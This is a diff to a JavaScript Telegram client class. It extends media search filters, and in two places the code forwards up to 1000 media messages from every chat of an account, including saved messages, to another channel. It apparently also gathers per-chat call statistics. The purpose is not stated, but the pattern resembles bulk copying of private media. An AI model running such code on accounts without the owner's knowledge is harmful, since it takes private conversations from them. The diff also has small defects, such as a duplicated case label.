@@ -144,7 +144,7 @@ class TelegramManager {
                     const finalChats = new Set(chats.map(chat => chat.chatId));
                     finalChats.add(me.id?.toString());
                     for (const chatId of finalChats) {
-                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE] });
+                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE] });
                         console.log("Forwarding messages from chat:", chatId, "to channel:", channelId);
                         await this.forwardMessages(chatId, channelId, mediaMessages.photo.messages);
                         await this.forwardMessages(chatId, channelId, mediaMessages.video.messages);
@@ -190,14 +190,12 @@ class TelegramManager {
                     const finalChats = new Set(chats.map(chat => chat.chatId));
                     finalChats.add(me.id?.toString());
                     for (const chatId of finalChats) {
-                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE] });
+                        const mediaMessages = await this.searchMessages({ chatId: chatId, limit: 1000, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.VOICE] });
                         console.log("Media Messages: ", mediaMessages);
                         const uniqueMessageIds = Array.from(new Set([
                             ...mediaMessages.photo.messages,
                             ...mediaMessages.video.messages,
                             ...mediaMessages.document.messages,
-                            ...mediaMessages.voice.messages,
-                            ...mediaMessages.all.messages,
                             ...mediaMessages.roundVideo.messages
                         ]));
                         const chunkSize = 30;
@@ -1843,6 +1841,16 @@ class TelegramManager {
             case 'url': return new telegram_1.Api.InputMessagesFilterUrl();
             case 'roundVideo': return new telegram_1.Api.InputMessagesFilterRoundVideo();
             case 'phtotoVideo': return new telegram_1.Api.InputMessagesFilterPhotoVideo();
+            case 'voice': return new telegram_1.Api.InputMessagesFilterVoice();
+            case 'roundVoice': return new telegram_1.Api.InputMessagesFilterRoundVoice();
+            case 'gif': return new telegram_1.Api.InputMessagesFilterGif();
+            case 'sticker': return new telegram_1.Api.InputMessagesFilterDocument();
+            case 'animation': return new telegram_1.Api.InputMessagesFilterDocument();
+            case 'music': return new telegram_1.Api.InputMessagesFilterMusic();
+            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
+            case 'location': return new telegram_1.Api.InputMessagesFilterGeo();
+            case 'contact': return new telegram_1.Api.InputMessagesFilterContacts();
+            case 'chatPhoto': return new telegram_1.Api.InputMessagesFilterChatPhotos();
             case 'phoneCalls': return new telegram_1.Api.InputMessagesFilterPhoneCalls({ missed: false });
             default: return new telegram_1.Api.InputMessagesFilterEmpty();
         }
@@ -2629,7 +2637,7 @@ class TelegramManager {
                         console.log(`Skipping chat ${chatId} - insufficient messages (${messages.length}) | total: ${messages.total} `);
                         return null;
                     }
-                    const messageStats = await this.searchMessages({ chatId, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE], limit: 10 });
+                    const messageStats = await this.searchMessages({ chatId, types: [message_search_dto_1.MessageMediaType.PHOTO, message_search_dto_1.MessageMediaType.ROUND_VIDEO, message_search_dto_1.MessageMediaType.VIDEO, message_search_dto_1.MessageMediaType.DOCUMENT, message_search_dto_1.MessageMediaType.VOICE, message_search_dto_1.MessageMediaType.ROUND_VOICE, message_search_dto_1.MessageMediaType.CHAT_PHOTO], limit: 10 });
                     console.log(`Retrieved ${messages.length} messages for chat ${chatId} | total: ${messages.total}`);
                     const callStats = {
                         total: 0,
